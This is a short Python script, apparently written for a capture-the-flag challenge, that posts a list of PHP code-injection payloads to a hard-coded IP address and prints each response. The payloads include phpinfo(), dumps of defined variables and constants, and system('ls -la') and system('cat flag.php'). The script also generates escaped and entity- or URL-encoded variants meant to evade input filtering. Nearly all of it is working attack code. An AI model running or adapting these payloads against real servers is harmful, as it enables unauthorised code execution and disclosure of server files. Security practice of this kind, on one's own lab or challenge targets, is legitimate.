# try_payloads.py
import sys
import requests
from urllib.parse import quote_plus

url = 'http://52.59.124.14:5011/'
post_url = url  # index page that accepts POST

payloads = [
    "phpinfo()",
    "phpinfo()",                 # repeated as baseline
    "print_r(get_defined_constants())",
    "print_r(get_defined_constants())",
    "print_r(get_defined_constants())",
    "print_r(get_defined_vars())",
    "print_r(get_defined_vars())",
    # various attempts to access $flag with different escaping
    "echo$flag",
    "echo\\$flag",
    "echo\\\\$flag",
    "echo\\\$flag",
    "var_dump($flag)",
    "var_dump\\($flag\\)",
    # attempts with backslash-escaped identifiers (underscore/v)
    "print_r(get_defined\\_vars())",
    "print_r(get\\_defined\\_constants())",
    # attempts using constant() (if FLAG defined as constant)
    "constant('FLAG')",
    "constant(\"FLAG\")",
    "echo constant('FLAG')",
    # system attempts (may be filtered)
    "system('ls -la')",
    "system('cat flag.php')",
    "system(ls)",
]

# Also try encoded variants for chars that htmlentities/addslashes may affect
extra = []
for p in list(payloads):
    extra.append(p.replace("_", "\\_"))
    extra.append(p.replace("_", "\\\\_"))
    # numeric/entity encodings for $ sign
    extra.append(p.replace("$", "&#36;"))
    extra.append(p.replace("$", "%24"))
    extra.append(p.replace("$", "\\$"))
payloads += extra

headers = {"User-Agent": "ctf-checker/1.0"}

session = requests.Session()
session.headers.update(headers)

for i, payload in enumerate(payloads, start=1):
    try:
        resp = session.post(post_url, data={"input": payload}, timeout=10, allow_redirects=True)
    except Exception as e:
        print(f"[{i:03}] payload={payload!r} ERROR: {e}")
        continue

    body = resp.text
    snippet = body[:2000]  # print first part
    print("="*80)
    print(f"[{i:03}] payload: {payload!r}  (HTTP {resp.status_code})")
    print("- snippet of response:")
    print(snippet)
    print("\n\n")
